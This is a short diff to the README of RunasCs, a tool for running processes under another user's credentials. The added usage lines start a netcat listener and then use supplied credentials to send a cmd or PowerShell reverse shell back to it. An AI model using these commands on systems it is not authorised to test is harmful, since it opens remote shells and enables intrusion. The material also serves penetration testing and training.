@@ -7,7 +7,12 @@ RunasCs is an utility to run specific processes with different permissions than 
 
 ## Usage
 
-    ./RunasCs.exe <username> <password> powershell.exe -r <localip>:<port>
+First start nc in local machine:
+
+    rlwrap nc -nvlp 4444
+
+    ./RunasCs.exe <username> <password> cmd -r <localip>:<port>
+    ./RunasCs.exe <username> <password> powershell-r <localip>:<port>
 
 ## More Information
 
